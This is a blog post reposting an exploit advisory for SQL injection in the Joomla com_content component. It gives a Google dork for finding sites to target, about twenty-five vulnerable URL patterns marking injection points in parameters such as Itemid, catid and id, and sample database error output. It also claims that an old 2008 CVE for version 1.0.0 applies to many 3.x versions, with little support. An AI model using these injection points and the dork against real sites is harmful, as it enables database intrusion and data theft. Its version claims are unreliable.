---
layout: post
title: Joomla Content 3.x
date: 2019-02-28 00:31 +0300
categories: [Exploits, SQL Injection]
tags: [exploits]
---







![](../../../assets/img/Exploits/joomiacontent.png)

A vulnerability in remote SQL injection has been detected in version 3.x of the Joomla Content component.

  

```
MD5 | 4986e17f535ba83a314a6dabae16cdf9
```

```perl
    ##########################################################################################
    
    # Exploit Title : Joomla Content Components 3.x SQL Injection
    # Author [ Discovered By ] : KingSkrupellos
    # Team : Cyberizm Digital Security Army
    # Date : 28/02/2019
    # Vendor Homepage : joomla.org
    # Software Download Links :
    github.com/asika32764/joomla-cmf/tree/master/administrator/components/com_content
    github.com/joomlagovbr/joomla-3.x/tree/master/administrator/components/com_content
    # Software Information Link : joomlart.com/documentation/purity-iii/override-joomla-com-content
    docs.joomla.org/Extension_types_(general_definitions)
    # Software Version : 1.x and 3.x - 3.7.4 - 3.8.3 - 3.8.4 - 3.8.10 previous/high versions may vulnerable
    Compatible with Joomla 1.x - 2.x and 3.x
    # Tested On : Windows and Linux
    # Category : WebApps
    # Exploit Risk : Medium
    # Google Dorks : inurl:''/index.php?option=com_content''
    # Vulnerability Type : CWE-89 [ Improper Neutralization of
    Special Elements used in an SQL Command ('SQL Injection') ]
    # Old CVE : CVE-2008-6923
    cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6923
    # PacketStormSecurity : packetstormsecurity.com/files/authors/13968
    # CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
    # Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos
    
    ##########################################################################################
    
    # Description about Software :
    ***************************
    Joomla Content Management System.
    
    Content (com_content) is the component which handles the display of content;
    
    users can view at the frontend of your site and, as an administrator, you can edit the content.
    
    ##########################################################################################
    
    According to the CVE-2008-6923 =>
    ****************************************
    
    SQL injection vulnerability in the content component (com_content) 1.0.0
    
    for Joomla! allows remote attackers to execute arbitrary SQL commands via the
    
    Itemid parameter in a blogcategory action to index.php.
    
    ##########################################################################################
    
    # Impact :
    **********
    Joomla Content Components 1.x [ and other versions may vulnerable ]
    
    component for Joomla is prone to an SQL-injection vulnerability because it fails to sufficiently
    
    sanitize user-supplied data before using it in an SQL query.
    
    Exploiting this issue could allow an attacker to compromise the application, access
    
    or modify data, or exploit latent vulnerabilities in the underlying database.
    
    A remote attacker can send a specially crafted request
    
    to the vulnerable application and execute arbitrary SQL commands in application`s database.
    
    Further exploitation of this vulnerability may result in unauthorized data manipulation.
    
    An attacker can exploit this issue using a browser.
    
    ##########################################################################################
    
    # SQL Injection Exploit :
    **********************
    /index.php?option=com_content&view=article&id=[ID-NUMBER]:home&catid=[SQL Injection]
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]&Itemid=[SQL Injection]
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]&catid=[ID-NUMBER]&Itemid=[SQL Injection]
    
    /index.php?option=com_content&task=view&id=[ID-NUMBER]&Itemid=[SQL Injection]
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]&Itemid=[SQL Injection]&lang=en
    
    /index.php?option=com_content&view=category&layout=blog&id=[ID-NUMBER]&itemid=[SQL Injection]&lang=ru
    
    /index.php?option=com_content&task=category&sectionid=&id=&Itemid=[SQL Injection]
    
    /index.php?option=com_content&view=archive&year=[SQL Injection]
    
    /index.php?option=com_content&task=blogcategory&id=[ID-NUMBER]&Itemid=[SQL Injection]
    
    /index.php?option=com_content&view=article&id=[SQL Injection]%3Afrontpage&lang=en
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]&Itemid[SQL Injection]
    
    /index.php?option=com_content&view=frontpage&Itemid=[SQL Injection]&lang=en%20[COUNTRYNAME]
    
    /index.php?option=com_content&task=blogcategory&id=[ID-NUMBER]&Itemid=[SQL Injection]
    
    /index.php?option=com_content&view=category&id=[ID-NUMBER]&layout=blog&Itemid=[SQL Injection]&format=feed&type=rss
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]%3Asupport-and-documentation&catid=[SQL Injection]%3Athe-project&lang=ro
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]%3Abillboard&catid=[SQL Injection]%3Amib&lang=en
    
    /index.php?option=com_content&view=section&layout=blog&id=[ID-NUMBER]&Itemid=[SQL Injection]&lang=en
    
    /index.php?option=com_content&view=article&id=[SQL Injection]%3Aonconoticias&lang=en
    
    /index.php?option=com_content&view=featured&lang=en&limitstart=[SQL Injection]
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]:[FOLDER-NAME]&catid=[ID-NUMBER]:faq&Itemid=[SQL Injection]
    
    /index.php?option=com_content&view=category&layout=blog&id=[ID-NUMBER]&Itemid=[ID-NUMBER]&limitstart=[SQL Injection]
    
    /index.php?id=[ID-NUMBER]&catid=[ID-NUMBER]&Itemid=[ID-NUMBER]&lang=it&option=com_content&view=article%27%60(%5B%7B%5E~&jjj=[SQL Injection]
    
    /index.php?view=article&id=[ID-NUMBER]:[ARTICLE-NAME]&tmpl=component&print=[SQL Injection]&layout=default&page=&option=com_content
    
    /index.php?option=com_content&view=article&id=[ID-NUMBER]%3[ARTICLE-NAME]&catid=[SQL Injection]%3[ARTICLE-NAME]&lang=en
    
    /index.php?view=article&catid=[ID-NUMBER]%3Alatest-news&id=[ID-NUMBER]%3[ARTICLE-NAME]&tmpl=component&print=[ID-NUMBER]&page=&option=com_content&Itemid=[SQL Injection]
    
    ##########################################################################################
    
    # Example SQL Database Error :
    *****************************
    You have an error in your SQL syntax; check the manual that corresponds
    to your MySQL server version for the right syntax to use near ':home AND `actie` = ''' at line 1
    Query: SELECT id FROM pages WHERE moduleid = 1 AND subid = 47:home AND `actie` = ''
    
    Database error:
    
    Duplicate entry '1-47-' for key 'moduleid'
    Query: INSERT INTO pages (`id`, `moduleid`, `subid`, `actie`, `template`,
    `subtemplate`, `title`, `menu`, `submenu`, `meta`, `header`) VALUES
    (NULL, '1', '47:home', '', 'default.php', 'default.html', '', '3', '', '', '0')
    
    You have an error in your SQL syntax; check the manual that corresponds to
    your MySQL server version for the right syntax to use near '' at line 6
    SQL=SELECT u.id AS id, u.name AS name FROM jos_users AS u WHERE
    
    No valid database connection You have an error in your SQL syntax; check the manual
    that corresponds to your MySQL server version for the right syntax to
    use near '' at line 1 SQL=SELECT home FROM jos_menu WHERE id=
    
    jos-Warning: exception 'RuntimeException' with message
    'Unknown column 'header'  in 'field list' SQL=SELECT `new_url`,`header`,`published`
    FROM `phw8l_redirect_links` WHERE `old_url` =
    
    No valid database connection You have an error in your SQL syntax; check the manual
     that corresponds to your MariaDB server version for the right syntax to use near
     'AND jf_content.published=1 AND jf_content.reference_id IN(1) AND jf_conten'
    at line 4 SQL=SELECT @rownum:=@rownum+1 AS rownum, jf_content.
    reference_field, jf_content.value, jf_content.reference_id, jf_content.original_
    value FROM jos_jf_content AS jf_content, (SELECT @rownum:=-1) AS r
    WHERE jf_content.language_id= AND jf_content.published=1 AND
    jf_content.reference_id IN(1) AND jf_content.reference_table='modules';
    DB function failed with error number 1064
    
    ##########################################################################################
    
    # Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team
    
    ##########################################################################################

```

<br>
  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)